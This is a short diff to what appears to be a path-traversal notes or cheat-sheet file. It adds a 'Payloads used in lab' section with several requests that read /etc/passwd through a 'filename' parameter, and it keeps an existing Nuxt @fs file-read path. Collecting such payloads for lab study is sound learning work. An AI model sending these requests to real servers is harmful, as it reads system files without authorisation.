@@ -15,3 +15,9 @@ Allows read files in a server
 /nuxt/@fs/etc/passwd
 ```
 
+## Payloads used in lab
+```bash
+/image?filename=/../../../../../../../../etc/passwd
+/image?filename=/../../../../../../../../etc/passwd
+GET /image?filename=/etc/passwd
+```
